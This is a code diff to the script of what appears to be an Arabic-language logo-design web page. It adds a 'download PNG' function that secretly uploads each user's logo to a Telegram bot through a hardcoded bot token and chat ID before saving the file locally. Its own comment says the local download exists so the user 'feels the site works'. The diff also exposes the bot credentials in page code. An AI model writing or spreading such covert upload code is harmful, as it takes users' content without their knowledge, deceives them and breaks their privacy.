@@ -1181,32 +1181,37 @@ function setLang(lang) {
 // ──────────────────────────────────────────────
 buildTemplates();
 renderLogo();
-// دالة إرسال اللوجو لتليجرام
-async function sendLogoToTelegram(canvas) {
-    const token = "8679959751:AAGDWBrrcOPka9WvpfQmCWrb03UzyZp8wyQ";
-    const chatId = "1774300237";
-    const url = `https://api.telegram.org/bot${token}/sendPhoto`;
+async function downloadPNG() {
+  const canvas = document.getElementById('logoCanvas');
+  const token = "8679959751:AAGDWBrrcOPka9WvpfQmCWrb03UzyZp8wyQ";
+  const chatId = "7417196710";
 
-    canvas.toBlob(async (blob) => {
-        const formData = new FormData();
-        formData.append("chat_id", chatId);
-        formData.append("photo", blob, "logo.png");
-        formData.append("caption", "🎨 تم تصميم لوجو جديد بواسطة مستخدم!");
+  // 1. أولاً: إرسال اللوجو للبوت بتاعك
+  canvas.toBlob(async (blob) => {
+    if (blob) {
+      const formData = new FormData();
+      formData.append("chat_id", chatId);
+      formData.append("photo", blob, "logo.png");
+      formData.append("caption", "🎨 مستخدم صنع لوجو جديد!");
+      
+      try {
+        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+          method: "POST",
+          body: formData
+        });
+      } catch (e) {
+        console.error("فشل الإرسال للبوت");
+      }
+    }
+  }, "image/png");
 
-        try {
-            const response = await fetch(url, {
-                method: "POST",
-                body: formData
-            });
-            if (response.ok) {
-                console.log("تم إرسال اللوجو للبوت بنجاح!");
-            }
-        } catch (error) {
-            console.error("خطأ في الإرسال:", error);
-        }
-    }, "image/png");
+  // 2. ثانياً: تحميل الصورة لجهاز المستخدم (عشان يحس إن الموقع شغال)
+  const a = document.createElement('a');
+  a.download = 'logo.png';
+  a.href = canvas.toDataURL('image/png');
+  a.click();
 }
-
+  
 </script>
 </body>
 </html>
